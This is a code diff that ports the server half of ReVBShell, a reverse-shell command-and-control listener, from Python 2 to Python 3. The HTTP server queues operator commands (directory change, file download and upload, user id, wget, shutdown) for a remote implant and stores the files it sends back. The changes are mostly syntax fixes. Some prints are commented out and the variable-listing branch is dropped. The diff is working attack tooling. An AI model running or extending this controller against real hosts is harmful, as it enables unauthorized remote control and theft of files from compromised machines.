@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# -*- coding:utf-8 -*- 
+# -*- coding:utf-8 -*-
 #
 # This software is provided under under the BSD 3-Clause License.
 # See the accompanying LICENSE file for more information.
@@ -13,16 +13,18 @@
 #  https://github.com/bitsadmin/ReVBShell
 #
 
-from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
 import cgi
 import os
 import sys
-from Queue import Queue
+from queue import Queue 
 from threading import Thread
 from shutil import copyfile, rmtree
 import ntpath
 PORT_NUMBER = 8080
-
+# reload(sys)
+# sys.setdefaultencoding('cp1251')
 class myHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         # File download
@@ -49,7 +51,7 @@ class myHandler(BaseHTTPRequestHandler):
             return
 
         if commands.empty():
-            content = 'NOOP'
+            content = b'NOOP'
         else:
             content = commands.get()
 
@@ -89,10 +91,10 @@ class myHandler(BaseHTTPRequestHandler):
             with file(os.path.join('Downloads', result_filename), 'wb') as f:
                 f.write(result_data)
 
-            print 'File \'%s\' downloaded.' % result_filename
+            # print 'File \'%s\' downloaded.' % result_filename
         # Print output
         else:
-            print result_data
+            print(result_data)
 
         sys.stdout.write('%s> ' % context)
 
@@ -100,7 +102,7 @@ class myHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write('OK')
+        self.wfile.write(b'OK')
         return
 
     # Do not write log messages to console
@@ -131,7 +133,7 @@ def main():
     global context, variables
     s = ''
     while True:
-        s = raw_input('%s> ' % context)
+        s = input('%s> ' % context)
         s = s.strip()
         splitcmd = s.split(' ', 1)
         cmd = splitcmd[0].upper()
@@ -165,12 +167,12 @@ def main():
 
                 # Check file existence
                 if not os.path.exists(args):
-                    print 'File not found: %s' % args
+                    #print 'File not found: %s' % args
                     continue
 
                 # Check if LHOST variable is set
                 if 'LHOST' not in variables:
-                    print 'Variable LHOST not set'
+                    #print 'Variable LHOST not set'
                     continue
                 lhost = variables['LHOST']
 
@@ -202,13 +204,11 @@ def main():
                 if args:
                     (variable, value) = args.split(' ')
                     variables[variable.upper()] = value
-                else:
-                    print '\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())
-                continue
-
+                continue    
+            
             # HELP
             elif cmd == 'HELP':
-                print 'Supported commands:\n' \
+                print('Supported commands:\n' \
                       '- CD [directory]     - Change directory. Shows current directory when without parameter.\n' \
                       '- DOWNLOAD [path]    - Download the file at [path] to the .\\Downloads folder.\n' \
                       '- GETUID             - Get shell user id.\n' \
@@ -229,7 +229,7 @@ def main():
                       '- UNSET [name]       - Unset a variable\n' \
                       '- UPLOAD [localpath] - Upload the file at [path] to the remote host.\n' \
                       '                       Note: Variable LHOST is required.\n' \
-                      '- WGET [url]         - Download file from url.\n'
+                      '- WGET [url]         - Download file from url.\n')
                 continue
 
             # SHUTDOWN
@@ -237,10 +237,12 @@ def main():
                 server.shutdown()
                 if os.path.exists('./upload'):
                     rmtree('./upload')
-                print 'Shutting down %s' % os.path.basename(__file__)
+                print('Shutting down %s' % os.path.basename(__file__))
                 exit(0)
 
-        commands.put(' '.join([cmd, args]).decode("ascii", "ignore").encode("utf-8"))
+        commands.put(' '.join([cmd, args]).encode("gbk"))
 
 if __name__ == '__main__':
     main()
+
+# shell dir C:\"Новая папка"
